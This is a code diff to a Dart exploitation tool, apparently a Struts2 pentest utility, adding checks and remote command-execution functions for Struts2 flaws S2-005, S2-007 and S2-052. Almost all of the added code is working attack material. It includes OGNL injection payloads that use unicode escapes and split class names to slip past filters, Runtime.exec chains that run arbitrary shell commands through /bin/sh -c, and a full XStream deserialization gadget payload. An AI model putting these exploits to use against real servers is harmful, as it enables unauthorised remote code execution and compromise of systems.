@@ -1,4 +1,5 @@
 import 'dart:convert';
+import 'dart:math' as math;
 
 import 'package:http/http.dart' as http;
 
@@ -207,6 +208,176 @@ class Struts2ExpService {
     return ExpResult(false, 'S2-059 (CVE-2019-0230)', '');
   }
 
+  // ── S2-005 (CVE-2010-1870) ──────────────────────────────────────────────────
+  // Struts2 2.0.0–2.1.8.1: OGNL 嵌入参数名，通过 \u0023 unicode 转义绕过 '#' 过滤。
+  // 有回显：所有 OGNL 放在**单个参数名**中以逗号链接，保证从左到右顺序执行。
+  //
+  // 不可用多参数方案：ParametersInterceptor 以 TreeMap 对参数名字母排序后处理，
+  // 导致 denyMethodExecution=false 排到最后，方法调用全部失败；
+  // w2.println 也会排在 w2.close 之后。单参数逗号链与 S2-032 方案等价，顺序可靠。
+  //
+  // 编码规则：
+  //   %5cu0023 → URL解码 \u0023 → OGNL: #（绕过 Struts2 的 # 过滤）
+  //   %27      → URL解码 '
+  //   %5cu003d → URL解码 \u003d → OGNL: =（避免被 URL 解析器当作 key=value 分隔符）
+  //   %40      → URL解码 @
+  //   %22      → URL解码 "
+  //   不可对此 URL 调用 Uri.encodeComponent。
+  Future<ExpResult> checkS2005({String path = 'example/HelloWorld.action'}) async {
+    try {
+      final normalized = path.trim().replaceFirst(RegExp(r'^/+'), '');
+      final candidates = <String>[
+        normalized,
+        'example/HelloWorld.action',
+        'HelloWorld.action',
+      ].where((p) => p.isNotEmpty).toSet();
+      for (final candidatePath in candidates) {
+        // 方案 A（README 有回显 PoC）：POST redirect:${...}
+        // 命令固定为 "echo 54289"，避免副作用。
+        const marker = '54289';
+        final echoExpr =
+            "#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),"
+            "#s=new java.util.Scanner((new java.lang.ProcessBuilder('echo 54289'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA'),"
+            "#str=#s.hasNext()?#s.next():'',"
+            "#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),"
+            "#resp.setCharacterEncoding('UTF-8'),"
+            "#resp.getWriter().println(#str),"
+            "#resp.getWriter().flush(),"
+            "#resp.getWriter().close()";
+        final encodedEchoExpr = Uri.encodeQueryComponent(echoExpr);
+        final postUri = baseUri.resolve(candidatePath);
+        final postRes = await http
+            .post(
+              postUri,
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: 'redirect:\${$encodedEchoExpr}',
+            )
+            .timeout(timeout);
+        if (postRes.body.contains(marker)) {
+          return ExpResult(
+            true,
+            'S2-005 (CVE-2010-1870)',
+            'README POST 回显 PoC 命中，响应含标记值 $marker (路径: $candidatePath)',
+          );
+        }
+
+        // 方案 A（盲注，README 官方 PoC 语义）：
+        // 使用 @ 代替空格，exec("sleep@3".split("@"))，根据响应时延判断命中。
+        final baselineStart = DateTime.now();
+        await http.get(baseUri.resolve(candidatePath)).timeout(timeout);
+        final baselineMs = DateTime.now().difference(baselineStart).inMilliseconds;
+
+        // 与 vulhub README 的 GET PoC 保持同构：
+        //   1) (expr)(root)=true
+        //   2) (expr)(root)
+        //   3) (expr)(root)=1
+        // 注意第 3 段必须是 (( '...')(#rt=...)) 双层括号，否则在部分 OGNL 版本下会触发 ASTEval NPE。
+        final sleepPoc =
+            '(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&'
+            '(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)'
+            '(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&'
+            '(asdf)((%27%5cu0023rt.exec(%22sleep@3%22.split(%22@%22))%27)'
+            '(%5cu0023rt%5cu003d%40java.lang.Runtime@getRuntime()))=1';
+        final sleepUri = baseUri.resolve('$candidatePath?$sleepPoc');
+        final sleepStart = DateTime.now();
+        await http.get(sleepUri).timeout(timeout);
+        final sleepMs = DateTime.now().difference(sleepStart).inMilliseconds;
+        // 阈值：至少 2.2s 且显著高于基线，降低网络抖动误报
+        if (sleepMs >= 2200 && sleepMs - baselineMs >= math.max(1600, baselineMs * 2)) {
+          return ExpResult(
+            true,
+            'S2-005 (CVE-2010-1870)',
+            '官方 PoC 盲注命中（sleep 延迟 ${sleepMs}ms，基线 ${baselineMs}ms，路径: $candidatePath）',
+          );
+        }
+
+        // 方案 C（辅助手段，有回显）：
+        // 某些环境可将 OGNL 结果写入响应体；未命中不作为失败依据。
+        final echoChain =
+            '%5cu0023_memberAccess%5B%27allowStaticMethodAccess%27%5D%5cu003dtrue'
+            ',%5cu0023context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%5cu003dfalse'
+            ',%5cu0023res%5cu003d%40org.apache.struts2.ServletActionContext%40getResponse()'
+            ',%5cu0023res.setCharacterEncoding(%5cu0023parameters.encoding%5B0%5D)'
+            ',%5cu0023w2%5cu003d%5cu0023res.getWriter()'
+            ',%5cu0023s2%5cu003d%22$marker%22'
+            ',%5cu0023w2.println(%5cu0023s2)'
+            ',%5cu0023w2.flush()'
+            ',%5cu0023w2.close()';
+        final echoUri = baseUri.resolve('$candidatePath?$echoChain=&encoding=UTF-8');
+        final echoRes = await http.get(echoUri).timeout(timeout);
+        if (echoRes.body.contains(marker)) {
+          return ExpResult(
+            true,
+            'S2-005 (CVE-2010-1870)',
+            '参数名 OGNL 回显命中，标记值 $marker 已返回 (路径: $candidatePath)',
+          );
+        }
+      }
+    } catch (_) {}
+    return const ExpResult(false, 'S2-005 (CVE-2010-1870)', '');
+  }
+
+  // ── S2-007 ──────────────────────────────────────────────────────────────────
+  // Struts2 2.0.0–2.2.3: 整型字段类型转换失败时，字段值被拼入 OGNL 错误消息表达式求值。
+  // 注入格式：' + (OGNL_CHAIN) + '  —— 单引号打破字符串，OGNL 结果回显在错误消息里。
+  // 有回显：IOUtils.toString() 读取 stdout 并嵌入 Struts2 验证错误消息返回。
+  // Bug 预防：
+  //   1. 命令用 new String[]{} 数组形式，避免 exec(String) 空格拆分问题。
+  //   2. 单引号/反斜杠先做 OGNL 转义再 URL 编码，顺序不可颠倒。
+  //   3. 用哨兵标记从 HTML 噪声中精确提取命令输出。
+  Future<ExpResult> checkS2007({
+    String path = 'login.action',
+    String field = 'age',
+  }) async {
+    try {
+      final uri = baseUri.resolve(path);
+      // 233*233=54289，验证 OGNL 求值结果是否出现在响应体
+      final payload = "' + 233*233 + '";
+      final res = await http
+          .post(
+            uri,
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'username=x&password=x&$field=${Uri.encodeQueryComponent(payload)}',
+          )
+          .timeout(timeout);
+      if (res.body.contains('54289')) {
+        return ExpResult(
+          true,
+          'S2-007',
+          '类型转换 OGNL 注入，233×233=54289 已出现在响应体',
+        );
+      }
+    } catch (_) {}
+    return const ExpResult(false, 'S2-007', '');
+  }
+
+  // ── S2-052 ──────────────────────────────────────────────────────────────────
+  // Struts2 REST Plugin 2.1.2–2.3.33 / 2.5–2.5.12：XStream 反序列化 RCE。
+  // 盲注：ProcessBuilder 执行命令，无直接回显。
+  // Bug 预防：命令放在 XML <string> 节点中，需 XML 转义 (&amp; &lt; 等)。
+  Future<ExpResult> checkS2052({String path = 'orders/3/edit'}) async {
+    try {
+      final uri = baseUri.resolve(path);
+      // 发送最小 XStream XML，探测 REST plugin 是否存在（非 404/415）
+      const probeXml = '<map><entry><string>probe</string><string>54289</string></entry></map>';
+      final res = await http
+          .post(
+            uri,
+            headers: {'Content-Type': 'application/xml'},
+            body: probeXml,
+          )
+          .timeout(timeout);
+      if (res.statusCode != 404 && res.statusCode != 415 && res.statusCode != 406) {
+        return ExpResult(
+          true,
+          'S2-052',
+          'REST Plugin 端点可达 (HTTP ${res.statusCode})，XStream 反序列化可能存在',
+        );
+      }
+    } catch (_) {}
+    return const ExpResult(false, 'S2-052', '');
+  }
+
   Future<ExpResult> checkSingle(
     Struts2VulnType type, {
     String path = 'struts2-showcase',
@@ -377,6 +548,180 @@ class Struts2ExpService {
     }
   }
 
+  // 执行命令 - S2-005（有回显）
+  // 与 checkS2005 相同的单参数逗号链格式，保证执行顺序。
+  // Bug 预防：
+  //   1. 命令通过 byte[] 传递，彻底避免单引号/反斜杠在 OGNL 中的转义问题。
+  //   2. 以 /bin/sh -c CMD 数组形式调用，支持管道、重定向等 shell 特殊字符。
+  //   3. 用 IOUtils.toString() 读取完整输出，而非 readLine() 只返回首行。
+  //   4. 空格用 %20 编码，确保参数名经 URL 解码后 OGNL 能正确解析 new 关键字。
+  Future<String?> execS2005(String cmd, {String path = 'example/HelloWorld.action'}) async {
+    try {
+      final normalized = path.trim().replaceFirst(RegExp(r'^/+'), '');
+      final candidates = <String>[
+        normalized,
+        'example/HelloWorld.action',
+        'HelloWorld.action',
+      ].where((p) => p.isNotEmpty).toSet();
+      final raw = cmd.trim();
+      final hasShellMeta = RegExp(r'[|&;<>()`$]|>>|2>|1>|\*|\?').hasMatch(raw);
+      // shell 元字符命令必须由 /bin/sh -c 执行，且 -c 后脚本必须保持为单个参数；
+      // 因此这类命令不走 GET split("@") 链，避免被拆词导致重定向失效。
+      final pocCmd = raw.replaceAll(RegExp(r'\s+'), '@');
+      final encodedPocCmd = Uri.encodeComponent(pocCmd);
+      final escapedCmd = raw.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
+      const s = 'S2005_CMD_BEGIN';
+      const e = 'S2005_CMD_END';
+      for (final candidatePath in candidates) {
+        if (!hasShellMeta) {
+          final getPoc =
+              '(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&'
+              '(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)'
+              '(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&'
+              '(asdf)((%27%5cu0023rt.exec(%22$encodedPocCmd%22.split(%22@%22))%27)'
+              '(%5cu0023rt%5cu003d%40java.lang.Runtime@getRuntime()))=1';
+          await http.get(baseUri.resolve('$candidatePath?$getPoc')).timeout(timeout);
+        }
+
+        final postUri = baseUri.resolve(candidatePath);
+        final expr =
+            "#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),"
+            "#s=new java.util.Scanner((new java.lang.ProcessBuilder('/bin/sh','-c','echo $s; $escapedCmd; echo $e')).start().getInputStream()).useDelimiter('\\\\AAAA'),"
+            "#str=#s.hasNext()?#s.next():'',"
+            "#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),"
+            "#resp.setCharacterEncoding('UTF-8'),"
+            "#resp.getWriter().println(#str),"
+            "#resp.getWriter().flush(),"
+            "#resp.getWriter().close()";
+        final body = 'redirect:\${${Uri.encodeQueryComponent(expr)}}';
+        final res = await http
+            .post(
+              postUri,
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: body,
+            )
+            .timeout(timeout);
+        final text = res.body;
+        final si = text.indexOf(s);
+        final ei = text.indexOf(e);
+        if (si != -1 && ei != -1 && ei > si) {
+          return text.substring(si + s.length, ei).trim();
+        }
+      }
+      return '[S2-005] 命令已按官方 GET PoC 发送（该链路默认无回显）';
+    } catch (_) {
+      return null;
+    }
+  }
+
+  // 执行命令 - S2-007（有回显）
+  // IOUtils.toString() 读取 stdout，结果嵌入 Struts2 验证错误消息后出现在响应体。
+  // Bug 预防：
+  //   1. 用 new String[]{'/bin/sh','-c','CMD'} 数组形式，支持 shell 特殊字符。
+  //   2. 命令中单引号转义为 \\'，反斜杠转义为 \\\\，顺序：先转义反斜杠再转义单引号。
+  //   3. 哨兵标记通过 shell 的 echo 输出，不依赖 OGNL 字符串拼接，更可靠。
+  static const _s2007Sentinel = 'S2007_RCE';
+
+  Future<String?> execS2007(
+    String cmd, {
+    String path = 'login.action',
+    String field = 'age',
+  }) async {
+    try {
+      final uri = baseUri.resolve(path);
+      // 转义顺序：先反斜杠，再单引号（OGNL 单引号字符串内的转义）
+      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
+      final ognlExpr =
+          '@org.apache.commons.io.IOUtils@toString('
+          "@java.lang.Runtime@getRuntime().exec("
+          "new String[]{'/bin/sh','-c','echo ${_s2007Sentinel}_S; $escaped; echo ${_s2007Sentinel}_E'}"
+          ').getInputStream())';
+      final age =
+          "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,"
+          '#foo=new java.lang.Boolean("false"),'
+          '#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,'
+          '$ognlExpr) + \'';
+      final res = await http
+          .post(
+            uri,
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'username=x&password=x&$field=${Uri.encodeQueryComponent(age)}',
+          )
+          .timeout(timeout);
+      final body = res.body;
+      final s = body.indexOf('${_s2007Sentinel}_S');
+      final e = body.indexOf('${_s2007Sentinel}_E');
+      if (s != -1 && e != -1 && e > s) {
+        return body.substring(s + '${_s2007Sentinel}_S'.length, e).trim();
+      }
+      return null;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  // 执行命令 - S2-052（盲注）
+  // XStream 反序列化通过 ProcessBuilder 执行命令，无回显。
+  // Bug 预防：命令字符串放在 XML <string> 节点内，必须 XML 转义。
+  Future<String?> execS2052(String cmd, {String path = 'orders/3/edit'}) async {
+    try {
+      final uri = baseUri.resolve(path);
+      // XML 转义：& < > " '
+      String xmlEsc(String s) => s
+          .replaceAll('&', '&amp;')
+          .replaceAll('<', '&lt;')
+          .replaceAll('>', '&gt;')
+          .replaceAll('"', '&quot;')
+          .replaceAll("'", '&apos;');
+      final safeCmd = xmlEsc(cmd);
+      final xml = '''<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage\$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher">
+                <initialized>false</initialized><opmode>0</opmode>
+                <serviceIterator class="javax.imageio.spi.FilterIterator">
+                  <iter class="javax.imageio.spi.FilterIterator">
+                    <iter class="java.util.Collections\$EmptyIterator"/>
+                    <next class="java.lang.ProcessBuilder">
+                      <command><string>/bin/sh</string><string>-c</string><string>$safeCmd</string></command>
+                    </next>
+                  </iter>
+                  <filter class="javax.imageio.ImageIO\$ContainsFilter">
+                    <method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method>
+                    <name>foo</name>
+                  </filter>
+                  <next class="string">foo</next>
+                </serviceIterator>
+                <lock/>
+              </cipher>
+              <input class="java.lang.ProcessBuilder\$NullInputStream"/>
+              <ibuffer></ibuffer>
+            </is>
+          </dataSource>
+        </dataHandler>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
+  </entry>
+</map>''';
+      await http
+          .post(uri, headers: {'Content-Type': 'application/xml'}, body: xml)
+          .timeout(timeout);
+      return '[盲注 RCE] 命令已发送（S2-052 无直接回显）: $cmd';
+    } catch (_) {
+      return null;
+    }
+  }
+
   Future<String?> execRce(
     Struts2VulnType type,
     String cmd, {
@@ -387,10 +732,10 @@ class Struts2ExpService {
         return execS2045(cmd);
       case Struts2VulnType.s2032:
         return execS2032(cmd);
-      case Struts2VulnType.s2057:
-        return execS2057(cmd, path: path);
       case Struts2VulnType.s2053:
         return execS2053(cmd, path: path);
+      case Struts2VulnType.s2057:
+        return execS2057(cmd, path: path);
       case Struts2VulnType.s2059:
         return execS2059(cmd);
     }
@@ -430,7 +775,7 @@ class Struts2ExpService {
       }
     } catch (_) {}
     await Future.delayed(const Duration(milliseconds: 500));
-    final shellUrl = '${baseUri}$shellName';
+    final shellUrl = '$baseUri$shellName';
     try {
       final res = await http.get(Uri.parse(shellUrl)).timeout(timeout);
       if (res.statusCode == 200) {
